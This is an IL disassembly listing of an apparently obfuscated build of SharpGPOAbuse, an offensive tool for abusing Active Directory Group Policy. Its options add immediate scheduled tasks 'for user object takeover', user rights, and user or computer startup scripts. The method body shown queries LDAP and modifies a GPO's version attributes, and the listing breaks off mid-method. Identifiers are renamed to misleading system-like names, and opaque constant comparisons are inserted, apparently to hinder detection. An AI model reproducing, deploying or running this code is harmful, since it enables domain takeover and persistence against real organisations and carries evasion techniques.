  .property instance bool STORE_CATEGORY()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0B 41 64 64 55 73 65 72 54 61 73 6B 02   // ....AddUserTask.
                                                                         00 54 02 08 52 65 71 75 69 72 65 64 00 54 0E 08   // .T..Required.T..
                                                                         48 65 6C 70 54 65 78 74 32 41 64 64 20 61 20 6E   // HelpText2Add a n
                                                                         65 77 20 69 6D 6D 65 64 69 61 74 65 20 74 61 73   // ew immediate tas
                                                                         6B 20 66 6F 72 20 75 73 65 72 20 6F 62 6A 65 63   // k for user objec
                                                                         74 20 74 61 6B 65 6F 76 65 72 2E )                // t takeover.
    .get instance bool SharpGPOAbuse.TimerCallback::ICategoryMembershipDataEntry()
    .set instance void SharpGPOAbuse.TimerCallback::SubcategoryMembershipEntryFieldId(bool)
  } // end of property TimerCallback::STORE_CATEGORY
  .property instance bool STORE_CATEGORY_SUBCATEGORY()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0D 41 64 64 55 73 65 72 52 69 67 68 74   // ....AddUserRight
                                                                         73 02 00 54 02 08 52 65 71 75 69 72 65 64 00 54   // s..T..Required.T
                                                                         0E 08 48 65 6C 70 54 65 78 74 15 41 64 64 20 72   // ..HelpText.Add r
                                                                         69 67 68 74 73 20 74 6F 20 61 20 75 73 65 72 2E ) // ights to a user.
    .get instance bool SharpGPOAbuse.TimerCallback::CategoryMembershipEntryFieldId()
    .set instance void SharpGPOAbuse.TimerCallback::COMServerEntry(bool)
  } // end of property TimerCallback::STORE_CATEGORY_SUBCATEGORY
  .property instance string STORE_CATEGORY_INSTANCE()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0A 55 73 65 72 52 69 67 68 74 73 02 00   // ....UserRights..
                                                                         54 02 08 52 65 71 75 69 72 65 64 00 54 0E 08 48   // T..Required.T..H
                                                                         65 6C 70 54 65 78 74 18 4E 65 77 20 73 74 61 72   // elpText.New star
                                                                         74 75 70 20 73 63 72 69 70 74 20 6E 61 6D 65 2E ) // tup script name.
    .get instance string SharpGPOAbuse.TimerCallback::ProgIdRedirectionEntry()
    .set instance void SharpGPOAbuse.TimerCallback::IProgIdRedirectionEntry(string)
  } // end of property TimerCallback::STORE_CATEGORY_INSTANCE
  .property instance bool CATEGORY()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 05 46 6F 72 63 65 02 00 54 02 08 52 65   // ....Force..T..Re
                                                                         71 75 69 72 65 64 00 54 0E 08 48 65 6C 70 54 65   // quired.T..HelpTe
                                                                         78 74 25 4F 76 65 72 77 72 69 74 65 20 65 78 69   // xt%Overwrite exi
                                                                         73 74 69 6E 67 20 66 69 6C 65 73 20 69 66 20 72   // sting files if r
                                                                         65 71 75 69 72 65 64 2E )                         // equired.
    .get instance bool SharpGPOAbuse.TimerCallback::ICLRSurrogateEntry()
    .set instance void SharpGPOAbuse.TimerCallback::AssemblyReferenceDependentAssemblyEntryFieldId(bool)
  } // end of property TimerCallback::CATEGORY
  .property instance bool CATEGORY_SUBCATEGORY()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0D 41 64 64 55 73 65 72 53 63 72 69 70   // ....AddUserScrip
                                                                         74 02 00 54 02 08 52 65 71 75 69 72 65 64 00 54   // t..T..Required.T
                                                                         0E 08 48 65 6C 70 54 65 78 74 1C 41 64 64 20 6E   // ..HelpText.Add n
                                                                         65 77 20 75 73 65 72 20 73 74 61 72 74 75 70 20   // ew user startup 
                                                                         73 63 72 69 70 74 2E )                            // script.
    .get instance bool SharpGPOAbuse.TimerCallback::AssemblyReferenceEntryFieldId()
    .set instance void SharpGPOAbuse.TimerCallback::WindowClassEntry(bool)
  } // end of property TimerCallback::CATEGORY_SUBCATEGORY
  .property instance bool CATEGORY_INSTANCE()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 11 41 64 64 43 6F 6D 70 75 74 65 72 53   // ....AddComputerS
                                                                         63 72 69 70 74 02 00 54 02 08 52 65 71 75 69 72   // cript..T..Requir
                                                                         65 64 00 54 0E 08 48 65 6C 70 54 65 78 74 20 41   // ed.T..HelpText A
                                                                         64 64 20 6E 65 77 20 63 6F 6D 70 75 74 65 72 20   // dd new computer 
                                                                         73 74 61 72 74 75 70 20 73 63 72 69 70 74 2E )    // startup script.
    .get instance bool SharpGPOAbuse.TimerCallback::ResourceTableMappingEntry()
    .set instance void SharpGPOAbuse.TimerCallback::IResourceTableMappingEntry(bool)
  } // end of property TimerCallback::CATEGORY_INSTANCE
  .property instance string IEnumSTORE_ASSEMBLY_INSTALLATION_REFERENCE()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0A 53 63 72 69 70 74 4E 61 6D 65 02 00   // ....ScriptName..
                                                                         54 02 08 52 65 71 75 69 72 65 64 00 54 0E 08 48   // T..Required.T..H
                                                                         65 6C 70 54 65 78 74 18 4E 65 77 20 73 74 61 72   // elpText.New star
                                                                         74 75 70 20 73 63 72 69 70 74 20 6E 61 6D 65 2E ) // tup script name.
    .get instance string SharpGPOAbuse.TimerCallback::IEntryPointEntry()
    .set instance void SharpGPOAbuse.TimerCallback::PermissionSetEntryFieldId(string)
  } // end of property TimerCallback::IEnumSTORE_ASSEMBLY_INSTALLATION_REFERENCE
  .property instance string IEnumSTORE_DEPLOYMENT_METADATA()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 00 0E 53 63 72 69 70 74 43 6F 6E 74 65 6E   // ....ScriptConten
                                                                         74 73 02 00 54 02 08 52 65 71 75 69 72 65 64 00   // ts..T..Required.
                                                                         54 0E 08 48 65 6C 70 54 65 78 74 1C 4E 65 77 20   // T..HelpText.New 
                                                                         73 74 61 72 74 75 70 20 73 63 72 69 70 74 20 63   // startup script c
                                                                         6F 6E 74 65 6E 74 73 2E )                         // ontents.
    .get instance string SharpGPOAbuse.TimerCallback::AssemblyRequestEntryFieldId()
    .set instance void SharpGPOAbuse.TimerCallback::DescriptionMetadataEntry(string)
  } // end of property TimerCallback::IEnumSTORE_DEPLOYMENT_METADATA
  .property instance bool StoreDeploymentMetadataEnumeration()
  {
    .custom instance void CommandLine.OptionAttribute::.ctor(string,
                                                             string) = ( 01 00 01 68 04 48 65 6C 70 02 00 54 02 08 52 65   // ...h.Help..T..Re
                                                                         71 75 69 72 65 64 00 54 0E 08 48 65 6C 70 54 65   // quired.T..HelpTe
                                                                         78 74 12 44 69 73 70 6C 61 79 20 68 65 6C 70 20   // xt.Display help 
                                                                         6D 65 6E 75 2E )                                  // menu.
    .get instance bool SharpGPOAbuse.TimerCallback::DeploymentMetadataEntry()
    .set instance void SharpGPOAbuse.TimerCallback::IDeploymentMetadataEntry(bool)
  } // end of property TimerCallback::StoreDeploymentMetadataEnumeration
} // end of class SharpGPOAbuse.TimerCallback

.class public auto ansi beforefieldinit SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  IIDENTITYAUTHORITY_REFERENCE_IDENTITY_TO_TEXT_FLAGS() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     string FXAssembly
    IL_0005:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000a:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_REFERENCE_IDENTITY_TO_TEXT_FLAGS

  .method public hidebysig static void  IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string IIdentityAuthority,
                                                                                                 string IAPPIDAUTHORITY_ARE_DEFINITIONS_EQUAL_FLAGS,
                                                                                                 string IAPPIDAUTHORITY_ARE_REFERENCES_EQUAL_FLAGS,
                                                                                                 string IAppIdAuthority,
                                                                                                 string ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS,
                                                                                                 string ISTORE_ENUM_ASSEMBLIES_FLAGS) cil managed
  {
    // Code size       4142 (0x102e)
    .maxstack  212
    .locals init ([0] string V_0,
             [1] class [mscorlib]System.Collections.Generic.List`1<string> V_1,
             [2] class [System.DirectoryServices]System.DirectoryServices.DirectorySearcher V_2,
             [3] string[] V_3,
             [4] string V_4,
             [5] string[] V_5,
             [6] int32 V_6,
             [7] string V_7,
             [8] int32 V_8,
             [9] class [System.DirectoryServices]System.DirectoryServices.SearchResult V_9,
             [10] int32 V_10,
             [11] class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_11,
             [12] string V_12,
             [13] string V_13,
             [14] class [mscorlib]System.Collections.Generic.List`1<string> V_14,
             [15] string V_15,
             [16] string V_16,
             [17] int32 V_17,
             [18] int32 V_18,
             [19] class [mscorlib]System.Collections.Generic.List`1<string> V_19,
             [20] int32 V_20,
             [21] string[] V_21,
             [22] int32 V_22,
             [23] valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string> V_23,
             [24] string V_24,
             [25] class [mscorlib]System.Collections.Generic.List`1<string> V_25,
             [26] int32 V_26,
             [27] int32 V_27,
             [28] class [mscorlib]System.Collections.Generic.List`1<string> V_28,
             [29] int32 V_29,
             [30] int32 V_30,
             [31] int32 V_31,
             [32] string[] V_32,
             [33] string V_33,
             [34] int32 V_34,
             [35] int32 V_35,
             [36] string V_36,
             [37] class [mscorlib]System.Collections.Generic.List`1<string> V_37,
             [38] string V_38,
             [39] string V_39,
             [40] class [mscorlib]System.Collections.Generic.List`1<string> V_40,
             [41] int32 V_41,
             [42] int32 V_42,
             [43] int32 V_43,
             [44] string[] V_44,
             [45] string V_45,
             [46] int32 V_46,
             [47] int32 V_47,
             [48] string V_48,
             [49] string V_49,
             [50] string V_50,
             [51] class [mscorlib]System.Collections.Generic.List`1<string> V_51,
             [52] string V_52,
             [53] int32 V_53,
             [54] int32 V_54,
             [55] class [mscorlib]System.Collections.Generic.List`1<string> V_55,
             [56] int32 V_56,
             [57] string[] V_57,
             [58] int32 V_58,
             [59] string V_59,
             [60] int32 V_60,
             [61] int32 V_61,
             [62] int32 V_62,
             [63] int32 V_63,
             [64] class [mscorlib]System.Collections.Generic.List`1<string> V_64,
             [65] int32 V_65,
             [66] string[] V_66,
             [67] int32 V_67,
             [68] string V_68,
             [69] int32 V_69,
             [70] int32 V_70,
             [71] class [mscorlib]System.Collections.Generic.List`1<string> V_71,
             [72] int32 V_72,
             [73] int32 V_73,
             [74] int32 V_74,
             [75] string[] V_75,
             [76] string V_76,
             [77] int32 V_77,
             [78] int32 V_78,
             [79] string V_79,
             [80] class [mscorlib]System.IO.StreamReader V_80,
             [81] class [mscorlib]System.IO.StreamWriter V_81,
             [82] string V_82)
    IL_0000:  ldsfld     string ThisAssembly
    IL_0005:  stloc.0
    IL_0006:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
    IL_000b:  stloc.1
    IL_000c:  ldarg.3
    IL_000d:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0012:  brtrue     IL_0021

    IL_0017:  ldsfld     string AssemblyRef
    IL_001c:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0021:  ldarg.0
    IL_0022:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string)
    IL_0027:  dup
    IL_0028:  ldsfld     string __Canon
    IL_002d:  ldarg.1
    IL_002e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0033:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::set_Path(string)
    IL_0038:  dup
    IL_0039:  ldc.i4.1
    IL_003a:  call       int32 '<Module>'(int32)
    IL_003f:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::set_AuthenticationType(valuetype [System.DirectoryServices]System.DirectoryServices.AuthenticationTypes)
    IL_0044:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::.ctor(class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry)
    IL_0049:  stloc.2
    IL_004a:  ldloc.2
    IL_004b:  ldsfld     string ICloneable
    IL_0050:  ldarg.2
    IL_0051:  ldsfld     string IEnumerable
    IL_0056:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_005b:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::set_Filter(string)
    IL_0060:  ldarg.s    ISTORE_ENUM_ASSEMBLIES_FLAGS
    IL_0062:  ldsfld     string ICollection
    IL_0067:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_006c:  brfalse    IL_0094

    IL_0071:  ldc.i4.2
    IL_0072:  newarr     [mscorlib]System.String
    IL_0077:  dup
    IL_0078:  ldc.i4.0
    IL_0079:  ldsfld     string IList
    IL_007e:  stelem.ref
    IL_007f:  dup
    IL_0080:  ldc.i4.1
    IL_0081:  ldsfld     string Array
    IL_0086:  stelem.ref
    IL_0087:  stloc.3
    IL_0088:  ldsfld     string IComparer`1
    IL_008d:  stloc.s    V_4
    IL_008f:  br         IL_00b2

    IL_0094:  ldc.i4.2
    IL_0095:  newarr     [mscorlib]System.String
    IL_009a:  dup
    IL_009b:  ldc.i4.0
    IL_009c:  ldsfld     string ValueType
    IL_00a1:  stelem.ref
    IL_00a2:  dup
    IL_00a3:  ldc.i4.1
    IL_00a4:  ldsfld     string IEnumerator
    IL_00a9:  stelem.ref
    IL_00aa:  stloc.3
    IL_00ab:  ldsfld     string SZArrayHelper
    IL_00b0:  stloc.s    V_4
    IL_00b2:  ldloc.3
    IL_00b3:  stloc.s    V_5
    IL_00b5:  ldc.i4.0
    IL_00b6:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_00bb:  ldlen
    IL_00bc:  sub
    IL_00bd:  stloc.s    V_6
    IL_00bf:  br         IL_0108

    IL_00c4:  ldloc.s    V_5
    IL_00c6:  ldloc.s    V_6
    IL_00c8:  ldelem     [mscorlib]System.String
    IL_00cd:  stloc.s    V_7
    IL_00cf:  ldloc.2
    IL_00d0:  callvirt   instance class [System]System.Collections.Specialized.StringCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::get_PropertiesToLoad()
    IL_00d5:  ldc.i4     0x6f619766
    IL_00da:  stloc.s    V_8
    IL_00dc:  ldloc.s    V_8
    IL_00de:  ldc.i4     0x42572039
    IL_00e3:  beq        IL_00ee

    IL_00e8:  ldarg.0
    IL_00e9:  br         IL_00f7

    IL_00ee:  nop
    IL_00ef:  ldloc.s    V_7
    IL_00f1:  br         IL_00f7

    IL_00f6:  nop
    IL_00f7:  callvirt   instance int32 [System]System.Collections.Specialized.StringCollection::Add(string)
    IL_00fc:  pop
    IL_00fd:  ldloc.s    V_6
    IL_00ff:  ldc.i4.1
    IL_0100:  call       int32 '<Module>'(int32)
    IL_0105:  add
    IL_0106:  stloc.s    V_6
    IL_0108:  ldloc.s    V_6
    IL_010a:  ldloc.s    V_5
    IL_010c:  ldlen
    IL_010d:  conv.i4
    IL_010e:  blt.s      IL_00c4

    IL_0110:  ldnull
    IL_0111:  stloc.s    V_9
    .try
    {
      IL_0113:  ldloc.2
      IL_0114:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResult [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::FindOne()
      IL_0119:  stloc.s    V_9
      IL_011b:  leave      IL_0146

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0120:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_0125:  ldsfld     string IDisposable
      IL_012a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_012f:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0134:  ldc.i4.0
      IL_0135:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_013a:  ldlen
      IL_013b:  add
      IL_013c:  call       void [mscorlib]System.Environment::Exit(int32)
      IL_0141:  leave      IL_0146

    }  // end handler
    IL_0146:  ldc.i4.0
    IL_0147:  stloc.s    V_10
    IL_0149:  ldloc.s    V_9
    IL_014b:  brfalse    IL_0ed1

    IL_0150:  ldloc.s    V_9
    IL_0152:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry [System.DirectoryServices]System.DirectoryServices.SearchResult::GetDirectoryEntry()
    IL_0157:  stloc.s    V_11
    IL_0159:  ldarg.s    ISTORE_ENUM_ASSEMBLIES_FLAGS
    IL_015b:  ldsfld     string IEnumerator`1
    IL_0160:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_0165:  brfalse    IL_01b0

    IL_016a:  ldloc.s    V_11
    IL_016c:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
    IL_0171:  ldsfld     string ArraySegment`1
    IL_0176:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
    IL_017b:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
    IL_0180:  call       int32 [mscorlib]System.Convert::ToInt32(object)
    IL_0185:  ldc.i4.1
    IL_0186:  call       int32 '<Module>'(int32)
    IL_018b:  add
    IL_018c:  stloc.s    V_10
    IL_018e:  ldloc.s    V_11
    IL_0190:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
    IL_0195:  ldsfld     string IComparable
    IL_019a:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
    IL_019f:  ldloc.s    V_10
    IL_01a1:  box        [mscorlib]System.Int32
    IL_01a6:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
    IL_01ab:  br         IL_01f0

    IL_01b0:  ldloc.s    V_11
    IL_01b2:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
    IL_01b7:  ldsfld     string IComparable`1
    IL_01bc:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
    IL_01c1:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
    IL_01c6:  call       int32 [mscorlib]System.Convert::ToInt32(object)
    IL_01cb:  ldc.i4     0x10000
    IL_01d0:  add
    IL_01d1:  stloc.s    V_10
    IL_01d3:  ldloc.s    V_11
    IL_01d5:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
    IL_01da:  ldsfld     string IEquatable`1
    IL_01df:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
    IL_01e4:  ldloc.s    V_10
    IL_01e6:  box        [mscorlib]System.Int32
    IL_01eb:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
    IL_01f0:  ldsfld     string ThrowHelper
    IL_01f5:  stloc.s    V_12
    IL_01f7:  ldsfld     string IFormattable
    IL_01fc:  stloc.s    V_13
    IL_01fe:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0200:  ldsfld     string IConvertible
    IL_0205:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_020a:  brtrue     IL_0231

    IL_020f:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0211:  ldsfld     string Enum
    IL_0216:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_021b:  brtrue     IL_0231

    IL_0220:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0222:  ldsfld     string ExceptionArgument
    IL_0227:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_022c:  brfalse    IL_087e

    IL_0231:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0233:  ldsfld     string ExceptionResource
    IL_0238:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_023d:  brtrue     IL_0253

    IL_0242:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0244:  ldsfld     string IEnumerable`1
    IL_0249:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_024e:  brfalse    IL_0261

    IL_0253:  ldsfld     string String
    IL_0258:  stloc.s    V_12
    IL_025a:  ldsfld     string StringSplitOptions
    IL_025f:  stloc.s    V_13
    IL_0261:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0263:  ldsfld     string IComparer
    IL_0268:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_026d:  brfalse    IL_0280

    IL_0272:  ldsfld     string IEqualityComparer
    IL_0277:  stloc.s    V_12
    IL_0279:  ldsfld     string IEqualityComparer`1
    IL_027e:  stloc.s    V_13
    IL_0280:  nop
    .try
    {
      IL_0281:  ldloc.s    V_11
      IL_0283:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0288:  ldloc.s    V_4
      IL_028a:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_028f:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_0294:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0299:  ldloc.s    V_13
      IL_029b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02a0:  brtrue     IL_0833

      IL_02a5:  ldloc.s    V_11
      IL_02a7:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_02ac:  ldloc.s    V_4
      IL_02ae:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_02b3:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_02b8:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_02bd:  ldloc.s    V_12
      IL_02bf:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02c4:  brfalse    IL_062e

      IL_02c9:  ldloc.s    V_11
      IL_02cb:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_02d0:  ldloc.s    V_4
      IL_02d2:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_02d7:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_02dc:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_02e1:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_02e6:  stloc.s    V_14
      IL_02e8:  ldloc.s    V_13
      IL_02ea:  stloc.s    V_15
      IL_02ec:  ldc.i4.1
      IL_02ed:  call       int32 '<Module>'(int32)
      IL_02f2:  newarr     [mscorlib]System.Char
      IL_02f7:  dup
      IL_02f8:  ldc.i4.0
      IL_02f9:  ldc.i4.s   91
      IL_02fb:  stelem.i2
      IL_02fc:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0301:  stloc.s    V_5
      IL_0303:  ldc.i4.0
      IL_0304:  stloc.s    V_6
      IL_0306:  br         IL_0357

      IL_030b:  ldloc.s    V_5
      IL_030d:  ldloc.s    V_6
      IL_030f:  ldelem     [mscorlib]System.String
      IL_0314:  stloc.s    V_16
      IL_0316:  ldloc.s    V_14
      IL_0318:  ldloc.s    V_16
      IL_031a:  ldsfld     string StringComparer
      IL_031f:  ldsfld     string CultureAwareComparer
      IL_0324:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0329:  ldsfld     string OrdinalComparer
      IL_032e:  ldsfld     string StringComparison
      IL_0333:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0338:  ldsfld     string ISerializable
      IL_033d:  ldsfld     string StringBuilder
      IL_0342:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0347:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_034c:  ldloc.s    V_6
      IL_034e:  ldc.i4.1
      IL_034f:  call       int32 '<Module>'(int32)
      IL_0354:  add
      IL_0355:  stloc.s    V_6
      IL_0357:  ldloc.s    V_6
      IL_0359:  ldloc.s    V_5
      IL_035b:  ldlen
      IL_035c:  conv.i4
      IL_035d:  blt.s      IL_030b

      IL_035f:  ldc.i4.1
      IL_0360:  stloc.s    V_17
      IL_0362:  br         IL_04af

      IL_0367:  ldloc.s    V_14
      IL_0369:  ldc.i4     0x2d142ba5
      IL_036e:  stloc.s    V_18
      IL_0370:  ldloc.s    V_18
      IL_0372:  ldc.i4     0x4ecc04b8
      IL_0377:  beq        IL_0382

      IL_037c:  ldarg.0
      IL_037d:  br         IL_038b

      IL_0382:  nop
      IL_0383:  ldloc.s    V_17
      IL_0385:  br         IL_038b

      IL_038a:  nop
      IL_038b:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0390:  ldloc.s    V_12
      IL_0392:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0397:  brfalse    IL_04a4

      IL_039c:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_03a1:  stloc.s    V_19
      IL_03a3:  ldloc.s    V_14
      IL_03a5:  ldc.i4     0x7a7b5852
      IL_03aa:  stloc.s    V_20
      IL_03ac:  ldloc.s    V_20
      IL_03ae:  ldc.i4     0x44dd9cca
      IL_03b3:  beq        IL_03be

      IL_03b8:  ldarg.0
      IL_03b9:  br         IL_03c7

      IL_03be:  nop
      IL_03bf:  ldloc.s    V_17
      IL_03c1:  br         IL_03c7

      IL_03c6:  nop
      IL_03c7:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_03cc:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_03d1:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_03d6:  stloc.s    V_21
      IL_03d8:  ldc.i4.1
      IL_03d9:  call       int32 '<Module>'(int32)
      IL_03de:  stloc.s    V_22
      IL_03e0:  br         IL_03fb

      IL_03e5:  ldloc.s    V_19
      IL_03e7:  ldloc.s    V_21
      IL_03e9:  ldloc.s    V_22
      IL_03eb:  ldelem     [mscorlib]System.String
      IL_03f0:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_03f5:  ldloc.s    V_22
      IL_03f7:  ldc.i4.1
      IL_03f8:  add
      IL_03f9:  stloc.s    V_22
      IL_03fb:  ldloc.s    V_22
      IL_03fd:  ldloc.s    V_21
      IL_03ff:  ldlen
      IL_0400:  conv.i4
      IL_0401:  blt.s      IL_03e5

      IL_0403:  ldloc.s    V_19
      IL_0405:  ldloc.s    V_15
      IL_0407:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_040c:  ldloc.s    V_19
      IL_040e:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Sort()
      IL_0413:  ldloc.s    V_14
      IL_0415:  ldloc.s    V_17
      IL_0417:  ldloc.s    V_21
      IL_0419:  ldc.i4.0
      IL_041a:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_041f:  ldlen
      IL_0420:  add
      IL_0421:  ldelem     [mscorlib]System.String
      IL_0426:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                             !0)
      IL_042b:  ldloc.s    V_19
      IL_042d:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_0432:  stloc.s    V_23
      .try
      {
        IL_0434:  br         IL_0488

        IL_0439:  ldloca.s   V_23
        IL_043b:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_0440:  stloc.s    V_24
        IL_0442:  ldloc.s    V_14
        IL_0444:  stloc.s    V_25
        IL_0446:  ldloc.s    V_17
        IL_0448:  stloc.s    V_6
        IL_044a:  ldloc.s    V_25
        IL_044c:  ldloc.s    V_6
        IL_044e:  ldloc.s    V_25
        IL_0450:  ldc.i4     0x6c9e2027
        IL_0455:  stloc.s    V_26
        IL_0457:  ldloc.s    V_26
        IL_0459:  ldc.i4     0x4179e20d
        IL_045e:  beq        IL_0469

        IL_0463:  ldarg.0
        IL_0464:  br         IL_0472

        IL_0469:  nop
        IL_046a:  ldloc.s    V_6
        IL_046c:  br         IL_0472

        IL_0471:  nop
